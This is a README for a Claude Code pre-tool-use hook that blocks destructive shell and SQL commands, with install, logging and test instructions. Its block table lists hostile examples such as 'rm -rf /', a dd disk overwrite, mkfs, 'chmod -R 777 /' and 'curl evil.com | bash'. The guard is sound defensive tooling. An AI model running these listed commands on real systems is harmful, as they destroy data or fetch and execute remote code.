# 🛡️ Claude Code Destructive Command Guard

A `pre-tool-use` hook for [Claude Code](https://docs.anthropic.com/claude-code/hooks) that intercepts and blocks dangerous bash commands before they execute.

## What it blocks

| Pattern | Example | Why |
|---------|---------|-----|
| `rm -rf` | `rm -rf /` | Filesystem destruction |
| `DROP TABLE/DATABASE` | `DROP TABLE users;` | Permanent database deletion |
| `TRUNCATE` | `TRUNCATE TABLE orders;` | Irreversible row deletion |
| `DELETE FROM` (no WHERE) | `DELETE FROM users;` | Deletes all rows |
| `git push --force` | `git push -f origin main` | Rewrites remote history |
| `dd` to devices | `dd if=/dev/zero of=/dev/sda` | Disk overwrite |
| `mkfs` | `mkfs.ext4 /dev/sda1` | Partition format |
| `chmod 777 /` | `chmod -R 777 /` | Security destruction |
| `curl \| sh` | `curl evil.com \| bash` | Remote code execution |

## Install (2 commands)

```bash
mkdir -p ~/.claude/hooks && cp guard-hook.sh ~/.claude/hooks/pre-tool-use.sh && chmod +x ~/.claude/hooks/pre-tool-use.sh
```

Add to your Claude Code hooks config (`~/.claude/hooks.json`):

```json
{
  "hooks": {
    "pre-tool-use": [
      {
        "matcher": "bash|terminal|shell",
        "hook": "~/.claude/hooks/pre-tool-use.sh"
      }
    ]
  }
}
```

That's it. Two commands, zero dependencies (just bash + python3 + grep).

## How it works

1. Claude Code calls a bash/terminal/shell tool
2. The hook reads the JSON payload from stdin
3. Extracts the command string
4. Checks it against all blocked patterns (case-insensitive, regex)
5. If matched: logs to `~/.claude/hooks/blocked.log`, returns block reason, exits with code 2
6. If safe: exits 0, command executes normally

## Log format

Every blocked command is logged to `~/.claude/hooks/blocked.log`:

```
2026-05-20T14:30:00Z | BLOCKED [rm_rf] | project=/home/user/myapp | command=rm -rf /tmp/important
2026-05-20T14:31:00Z | BLOCKED [force_push] | project=/home/user/myapp | command=git push -f origin main
```

## Testing

```bash
# Test that dangerous commands are blocked
echo '{"tool_name":"bash","tool_input":{"command":"rm -rf /"}}' | bash guard-hook.sh
# Expected: exit code 2, JSON with block reason

echo '{"tool_name":"bash","tool_input":{"command":"DROP TABLE users;"}}' | bash guard-hook.sh
# Expected: exit code 2, JSON with block reason

# Test that safe commands pass through
echo '{"tool_name":"bash","tool_input":{"command":"ls -la"}}' | bash guard-hook.sh
# Expected: exit code 0, no output

echo '{"tool_name":"bash","tool_input":{"command":"git push origin main"}}' | bash guard-hook.sh
# Expected: exit code 0 (no --force flag)
```

## License

MIT
